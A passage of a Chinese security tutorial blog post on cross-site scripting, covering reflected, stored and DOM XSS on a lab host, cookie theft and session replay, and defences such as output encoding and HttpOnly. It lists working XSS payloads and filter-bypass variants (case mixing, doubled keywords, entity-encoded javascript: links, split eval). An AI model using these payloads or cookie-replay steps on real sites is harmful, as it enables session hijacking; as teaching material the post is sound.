<pre><code>     注意到，反射型XSS 代码出现在keywords 参数中。
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.4.7.130/cms/search.php? keywords=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E&amp;button=%E6%90%9C%E7%B4%A2 </span><br></pre></td></tr></table></figure>

<p>​		容易被发现，利用难度高，很多漏洞提交平台不收反射型XSS 漏洞。 </p>
<h4 id="1-5-2-存储型XSS"><a href="#1-5-2-存储型XSS" class="headerlink" title="1.5.2  存储型XSS"></a><strong>1.5.2</strong>  <strong>存储型</strong>XSS</h4><p>​		持久性跨站脚本。持久性体现在XSS 代码不是在某个参数（变量）中，而是写进数据库或文件等可以永久保存数据的介质中。存储型XSS 通常发生在留言板等地方，可以在留言板位置进行留言，将恶意代码写进数据库中。</p>
<p>​		危害面比较广，漏洞提交平台会接收此类漏洞。</p>
<h4 id="1-5-3DOM型XSS"><a href="#1-5-3DOM型XSS" class="headerlink" title="1.5.3DOM型XSS"></a><strong>1.5.3</strong>DOM<strong>型XSS</strong></h4><p>​		DOM 型XSS 是一种XSS 攻击，其中攻击的代码是由于修改受害者浏览器页面的DOM 树而执行的。特殊的地方就是攻击代码(payload) 在浏览器本地修改DOM 树而执行，并不会将payload 上传到服务器，这也使得DOM 型XSS 比较难以检测。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.4.7.130/xss_test/DOM-XSS/?message=%3Cscript%3Ealert(/xss/)%3C/script%3E </span><br><span class="line">http://10.4.7.130/xss_test/DOM-XSS/#message=%3Cscript%3Ealert(/xss/)%3C/script%3E</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong></p>
<ul>
<li><p>修改DOM 树执行；</p>
</li>
<li><p>采用# 号的方式，参数不会提交到服务器。</p>
</li>
</ul>
<h2 id="2-XSS-攻防案例"><a href="#2-XSS-攻防案例" class="headerlink" title="2.XSS 攻防案例"></a>2.<strong>XSS</strong> 攻防案例</h2><h3 id="2-1-固定会话"><a href="#2-1-固定会话" class="headerlink" title="2.1  固定会话"></a><strong>2.1</strong>  固定会话</h3><h4 id="2-1-1-原理"><a href="#2-1-1-原理" class="headerlink" title="2.1.1  原理"></a><strong>2.1.1</strong>  <strong>原理</strong></h4><p>​		用户会话令牌利用Cookie 来实现的，Cookie 是存储在浏览器端的一小段文本，相当于身份证，会有窃取和欺骗的风险。可以利用XSS 攻击窃取到浏览器里的Cookie 信息。</p>
<p>​		由于XXS 触发需要浏览器客户端用户（受害者）参与，攻击者不清楚何时何地会触发漏洞，这个过程一般被成为XSS 盲打。</p>
<h4 id="2-1-2-xss平台"><a href="#2-1-2-xss平台" class="headerlink" title="2.1.2  xss平台"></a><strong>2.1.2</strong>  xss<strong>平台</strong></h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/xss.assets/clip_image089-1693013949473.gif" alt="img"></p>
<h4 id="2-1-3-窃取"><a href="#2-1-3-窃取" class="headerlink" title="2.1.3  窃取"></a><strong>2.1.3</strong>  <strong>窃取</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin; userid=1; PHPSESSID=b09m2i6ppthmqqg26no26co6m3</span><br></pre></td></tr></table></figure>

<h4 id="2-1-4-欺骗"><a href="#2-1-4-欺骗" class="headerlink" title="2.1.4  欺骗"></a><strong>2.1.4</strong>  <strong>欺骗</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.cookie = &#x27;username=admin&#x27;; document.cookie = &#x27;userid=1&#x27;;</span><br><span class="line"></span><br><span class="line">document.cookie = &#x27;PHPSESSID=b09m2i6ppthmqqg26no26co6m3&#x27;;</span><br></pre></td></tr></table></figure>

<h4 id="2-1-5-影响"><a href="#2-1-5-影响" class="headerlink" title="2.1.5  影响"></a><strong>2.1.5</strong>  <strong>影响</strong></h4><ul>
<li><p>黑客可以利用Cookie 信息，也就是身份凭据，登录后台；</p>
</li>
<li><p>即使管理员注销登录，会话依然有效；</p>
</li>
<li><p>即使管理员修改了密码，会话依然有效。</p>
</li>
</ul>
<h4 id="2-1-6-防御"><a href="#2-1-6-防御" class="headerlink" title="2.1.6  防御"></a><strong>2.1.6</strong>  <strong>防御</strong></h4><ul>
<li><p>根据实际情况采用“单点登录”；、</p>
</li>
<li><p>采用Session 机制；</p>
</li>
<li><p>设置token 值；</p>
</li>
<li><p>对Cookie 数据，设置HttpOnly 属性；</p>
</li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">Date</span>: Mon, <span class="number">23</span> Nov <span class="number">2020</span> <span class="number">02</span>:<span class="number">16</span>:<span class="number">57</span> GMT Server: Apache</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">X</span>-Powered-By: PHP/<span class="number">5</span>.<span class="number">6</span>.<span class="number">40</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Set</span>-Cookie: username=AJEST; expires=Mon, <span class="number">23</span>-Nov-<span class="number">2020</span> <span class="number">03</span>:<span class="number">16</span>:<span class="number">57</span> GMT; Max-Age=<span class="number">3600</span>; path=/; domain=localhost; httponly</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Keep</span>-Alive: timeout=<span class="number">5</span>, max=<span class="number">100</span> Connection: Keep-Alive</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Type: text/html; charset=UTF-<span class="number">8</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"></span></span><br></pre></td></tr></table></figure>

<h2 id="3-XSS-攻防"><a href="#3-XSS-攻防" class="headerlink" title="3.XSS 攻防"></a>3.<strong>XSS</strong> 攻防</h2><h3 id="3-1-XSS-构造方法"><a href="#3-1-XSS-构造方法" class="headerlink" title="3.1 XSS 构造方法"></a><strong>3.1</strong> <strong>XSS</strong> 构造方法</h3><h4 id="3-1-1-利用"><a href="#3-1-1-利用" class="headerlink" title="3.1.1  利用&lt;&gt;"></a><strong>3.1.1</strong>  <strong>利用</strong><strong>&lt;&gt;</strong></h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> = <span class="string">https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u</span>=<span class="string">2866847033,2297252904&amp;fm</span>=<span class="string">26&amp;gp</span>=<span class="string">0.jpg</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="3-1-2-javascript-伪协议"><a href="#3-1-2-javascript-伪协议" class="headerlink" title="3.1.2  javascript 伪协议"></a><strong>3.1.2</strong>  <strong>javascript</strong> <strong>伪协议</strong></h4><p>可以通过URL 载入资源的标签。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">javascript:alert(/xss/)</span> &gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> = <span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>	<span class="comment">&lt;!-- IE6 --&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>XSS 攻击的是浏览器，受前端影响比较大。浏览器的类型，版本等因素都会影响XSS 的效果。 </p>
<p><strong>3.1.3</strong>  <strong>事件响应</strong></p>
<p>“事件驱动”是一种比较典型的编程思想。</p>
<table>
<thead>
<tr>
<th>事件类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>window 事件</td>
<td>对window 对象触发的事件</td>
</tr>
<tr>
<td>Form 事件</td>
<td>HTML 表单内触发的事件</td>
</tr>
<tr>
<td>Keyboard 事件</td>
<td>键盘事件</td>
</tr>
<tr>
<td>Mouse 事件</td>
<td>鼠标事件</td>
</tr>
<tr>
<td>Media 事件</td>
<td>由多媒体触发的事件</td>
</tr>
</tbody></table>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag"><span class="attr">src</span> = <span class="string">&quot;https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=2866847033,2297252904&amp;fm=26&amp;gp=0.jpg&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag"><span class="attr">onmouseover</span> = <span class="string">&#x27;alert(/dont touch me!/)&#x27;</span></span></span><br><span class="line"><span class="tag"><span class="attr">src</span> = <span class="string">&quot;https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=2866847033,2297252904&amp;fm=26&amp;gp=0.jpg&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&#x27;text&#x27;</span> <span class="attr">onkeydown</span> = <span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&#x27;text&#x27;</span> <span class="attr">onkeyup</span> = <span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="3-1-4-其他标签"><a href="#3-1-4-其他标签" class="headerlink" title="3.1.4  其他标签"></a><strong>3.1.4</strong>  <strong>其他标签</strong></h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">alert(/xss/)</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="3-1-5-参考"><a href="#3-1-5-参考" class="headerlink" title="3.1.5  参考"></a><strong>3.1.5</strong>  <strong>参考</strong></h4><ul>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">Cross-site scripting (XSS) cheat sheet</a></li>
</ul>
<h3 id="3-2-XSS-变形方式"><a href="#3-2-XSS-变形方式" class="headerlink" title="3.2 XSS 变形方式"></a><strong>3.2</strong> <strong>XSS</strong> 变形方式</h3><p>cms 网站搜索框存在反射性XSS 漏洞，POC 如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>尝试在代码角度，对XSS 漏洞进行修复：修改 &#x2F;cms&#x2F;search.php  文件，对 $_GET[‘keywords’]  进行过滤，代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">$keyword = $_GET[&#x27;keywords&#x27;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// $keyword = str_replace(&quot;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">&quot;, &quot;&quot;, $keyword);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">// $keyword = preg_replace(&quot;/<span class="tag">&lt;<span class="name">script</span>&gt;</span>/i&quot;, &quot;&quot;, $keyword);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">$keyword = preg_replace(&quot;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&quot;, &quot;&quot;, $keyword);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"> </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">// $keyword = str_replace(&quot;on&quot;, &quot;o_n&quot;, $keyword);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">$keyword = preg_replace(&quot;/on/i&quot;, &quot;o_n&quot;, $keyword);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">// $keyword = str_replace(&quot;&lt;&quot;, &quot;&quot;, $keyword);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">// $keyword = str_replace(&quot;&gt;&quot;, &quot;&quot;, $keyword);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">$keyword = htmlspecialchars($keyword);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">echo $keyword;</span></span></span><br></pre></td></tr></table></figure>



<h4 id="3-2-1大小写转换"><a href="#3-2-1大小写转换" class="headerlink" title="3.2.1大小写转换"></a><strong>3.2.1</strong>大小写转换</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">ONerror</span> = <span class="string">&#x27;alert(/xss/)&#x27;</span> <span class="attr">src</span> = <span class="string">&quot;#&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="3-2-2-关键字双写"><a href="#3-2-2-关键字双写" class="headerlink" title="3.2.2  关键字双写"></a><strong>3.2.2</strong>  <strong>关键字双写</strong></h4><p>绕过一次过滤。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;<span class="title function_ invoke__">alert</span>(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="3-2-3-对伪协议进行转码"><a href="#3-2-3-对伪协议进行转码" class="headerlink" title="3.2.3  对伪协议进行转码"></a><strong>3.2.3</strong>  <strong>对伪协议进行转码</strong></h4><p>HTML 编码：</p>
<table>
<thead>
<tr>
<th>字母</th>
<th>ASCII码</th>
<th>十进制编码</th>
<th>十六进制编码</th>
</tr>
</thead>
<tbody><tr>
<td>a</td>
<td>97</td>
<td>&#97;</td>
<td>&#x61;</td>
</tr>
<tr>
<td>c</td>
<td>99</td>
<td>&#99;</td>
<td>&#x63;</td>
</tr>
<tr>
<td>e</td>
<td>101</td>
<td>&#101;</td>
<td>&#x65;</td>
</tr>
</tbody></table>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&#x27;<span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span>:alert(/xss/) &#x27;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="3-2-4-插入其他字符"><a href="#3-2-4-插入其他字符" class="headerlink" title="3.2.4  插入其他字符"></a><strong>3.2.4</strong>  <strong>插入其他字符</strong></h4><p>可以将以下字符插入到任意位置</p>
<p>字符                                                 编码</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>编码</th>
</tr>
</thead>
<tbody><tr>
<td>Tab</td>
<td>&#9;</td>
</tr>
<tr>
<td>换行</td>
<td>&#10;</td>
</tr>
<tr>
<td>回车</td>
<td>&#13;</td>
</tr>
</tbody></table>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&#x27;j<span class="symbol">&amp;#9;</span>avasc<span class="symbol">&amp;#10;</span>r<span class="symbol">&amp;#13;</span>ipt:alert(/xss/)&#x27;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<p>将以下字符插入到头部位置。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&#x27;<span class="symbol">&amp;#01;</span><span class="symbol">&amp;#02;</span>j<span class="symbol">&amp;#9;</span>avasc<span class="symbol">&amp;#10;</span>r<span class="symbol">&amp;#13;</span>ipt:alert(/xss/)&#x27;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="3-2-5-引号的使用"><a href="#3-2-5-引号的使用" class="headerlink" title="3.2.5  引号的使用"></a><strong>3.2.5</strong>  <strong>引号的使用</strong></h4><p>HTML 语言对引号的使用要求不严格，某些过滤函数是“锱铢必较”。</p>
<ul>
<li><p>没有引号</p>
</li>
<li><p>单引号</p>
</li>
<li><p>双引号</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Img</span> <span class="attr">sRc</span>=<span class="string">#</span> <span class="attr">OnErRoR</span>=<span class="string">alert(/xss/);</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Img</span> <span class="attr">sRc</span> = <span class="string">&#x27;#&#x27;</span> <span class="attr">OnErRoR</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">Img</span> <span class="attr">sRc</span> = <span class="string">&quot;#&quot;</span> <span class="attr">OnErRoR</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="3-2-6-代替空格"><a href="#3-2-6-代替空格" class="headerlink" title="3.2.6  &#x2F; 代替空格"></a><strong>3.2.6</strong>  <strong>&#x2F;</strong> <strong>代替空格</strong></h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;Img/sRc=&#x27;#&#x27;/OnErRoR=&#x27;alert(/xss/)&#x27;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="3-2-7-拆分跨站"><a href="#3-2-7-拆分跨站" class="headerlink" title="3.2.7  拆分跨站"></a><strong>3.2.7</strong>  <strong>拆分跨站</strong></h4><p>将一段JS 代码拆成多段。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">z=<span class="string">&#x27;alert&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">z+=<span class="string">&#x27;(/xss/)&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(z)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="title function_">alert</span>(<span class="regexp">/xss/</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-3-XSS-的防御"><a href="#3-3-XSS-的防御" class="headerlink" title="3.3 XSS 的防御"></a><strong>3.3</strong> <strong>XSS</strong> 的防御</h3><p>​		XSS 过滤器的作用是过滤用户（浏览器客户端）提交的有害信息，从而达到防范XSS 攻击的效果。</p>
<h4 id="3-3-1-输入过滤"><a href="#3-3-1-输入过滤" class="headerlink" title="3.3.1  输入过滤"></a><strong>3.3.1</strong>  <strong>输入过滤</strong></h4><ul>
<li><p>永远不要相信用户的输入。</p>
</li>
<li><p>输入验证：对用户提交的信息进行“有效性”验证。</p>
</li>
<li><p>仅接受指定长度；</p>
</li>
<li><p>仅包含合法字符；</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// echo $_GET[&#x27;keywords&#x27;];</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$keywords</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;keywords&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$keywords</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$keywords</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$keywords</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$keywords</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$keywords</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&gt;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$keywords</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$keywords</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$keywords</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$keywords</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$keywords</span>); <span class="keyword">echo</span> <span class="variable">$keywords</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="3-3-2-输出编码"><a href="#3-3-2-输出编码" class="headerlink" title="3.3.2  输出编码"></a><strong>3.3.2</strong>  <strong>输出编码</strong></h4><p>HTML 编码是HTML 实体编码。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">$keywords = htmlspecialchars( $_GET[ &#x27;keywords&#x27; ] );</span><br></pre></td></tr></table></figure>

<h4 id="3-3-3-黑白名单策略"><a href="#3-3-3-黑白名单策略" class="headerlink" title="3.3.3  黑白名单策略"></a><strong>3.3.3</strong>  <strong>黑白名单策略</strong></h4><p>不管是采用输入过滤还是输出编码，都是针对用户提交的信息进行黑、白名单式的过滤：</p>
<ul>
<li><p>黑名单：非允许的内容</p>
</li>
<li><p>白名单：允许的内容</p>
</li>
</ul>
<h4 id="3-3-4-防御DOM型XSS"><a href="#3-3-4-防御DOM型XSS" class="headerlink" title="3.3.4  防御DOM型XSS"></a><strong>3.3.4</strong>  <strong>防御</strong>DOM型<strong>XSS</strong></h4><p>避免客户端文档重写，重定向或其他敏感操作。</p>
<h4 id="3-3-5-终极测试代码"><a href="#3-3-5-终极测试代码" class="headerlink" title="3.3.5  终极测试代码"></a><strong>3.3.5</strong>  <strong>终极测试代码</strong></h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;sCr<span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span>IPT&gt;OonN&#x27;&quot;\/(hrHRefEF)&lt;/sCr<span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span>IPT&gt;</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hbimg.huaban.com/535ad5a8d0a1762fc1cbe65f6e7748d373a8c57d7bfa-l5D3wU_fw658" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hbimg.huaban.com/535ad5a8d0a1762fc1cbe65f6e7748d373a8c57d7bfa-l5D3wU_fw658" title="头像" alt="头像"></a><div class="post-copyright__author_name">cgjil</div><div class="post-copyright__author_desc">你好啊，出发吧</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2022/11/08/%E6%BC%8F%E6%B4%9E/xss/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2022/11/08/%E6%BC%8F%E6%B4%9E/xss/')">xss</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2022/11/08/%E6%BC%8F%E6%B4%9E/xss/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=undefined&amp;url=http://example.com/2022/11/08/%E6%BC%8F%E6%B4%9E/xss/&amp;pic=undefined" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="rm.copyPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">cgjil</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__category-list"><a class="post-meta__box__categoryes" href="/categories/%E6%BC%8F%E6%B4%9E/"><span class="categoryes-punctuation"> <i class="anzhiyufont anzhiyu-icon-inbox"></i></span>漏洞<span class="categoryesPageCount">10</span></a></div><div class="post-meta__box__tag-list"></div></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/11/05/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/image/6.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">sql注入</div></div></a></div><div class="next-post pull-right"><a href="/2022/11/10/%E6%BC%8F%E6%B4%9E/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88csrf%EF%BC%89/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/image/14.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">跨站请求伪造（csrf）</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hbimg.huaban.com/535ad5a8d0a1762fc1cbe65f6e7748d373a8c57d7bfa-l5D3wU_fw658" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" ait="status"/></div></div><div class="author-info__description"><div 